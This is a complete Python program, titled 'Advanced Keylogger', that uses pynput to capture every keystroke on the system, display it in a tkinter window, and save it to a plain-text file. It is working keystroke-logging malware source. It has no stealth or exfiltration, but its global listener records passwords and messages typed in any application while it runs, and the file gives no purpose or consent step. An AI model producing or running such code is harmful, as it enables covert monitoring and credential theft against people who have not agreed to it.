import tkinter as tk
from tkinter import messagebox
from pynput import keyboard

log_data = []
listener = None
logging_active = False

def start_logging():
    global listener, logging_active
    if not logging_active:
        logging_active = True
        listener = keyboard.Listener(on_press=on_key_press)
        listener.start()
        log_box.insert(tk.END, "Logging started...\n")

def stop_logging():
    global listener, logging_active
    if logging_active:
        logging_active = False
        if listener:
            listener.stop()
        log_box.insert(tk.END, "Logging stopped.\n")

def on_key_press(key):
    try:
        log_data.append(key.char)
        log_text = key.char
    except AttributeError:
        log_data.append(str(key))
        log_text = str(key)
    log_box.insert(tk.END, log_text + "\n")
    log_box.see(tk.END)

def save_log():
    try:
        with open("keys_log.txt", "w", encoding="utf-8") as f:
            for entry in log_data:
                f.write(entry + "\n")
        messagebox.showinfo("Save Log", "Log saved to keys_log.txt")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to save log: {e}")

root = tk.Tk()
root.title("Advanced Keylogger")
root.geometry("500x400")

menubar = tk.Menu(root)
file_menu = tk.Menu(menubar, tearoff=0)
file_menu.add_command(label="Save Log", command=save_log)
file_menu.add_command(label="Clear Log", command=lambda: log_box.delete(1.0, tk.END))
menubar.add_cascade(label="File", menu=file_menu)
root.config(menu=menubar)

btn_frame = tk.Frame(root)
btn_frame.pack(pady=10)

start_btn = tk.Button(btn_frame, text="Start Logging", command=start_logging, bg="green", fg="white", width=15)
start_btn.grid(row=0, column=0, padx=5)

stop_btn = tk.Button(btn_frame, text="Stop Logging", command=stop_logging, bg="red", fg="white", width=15)
stop_btn.grid(row=0, column=1, padx=5)

log_box = tk.Text(root, height=15, width=60)
log_box.pack(pady=10)
root.mainloop()
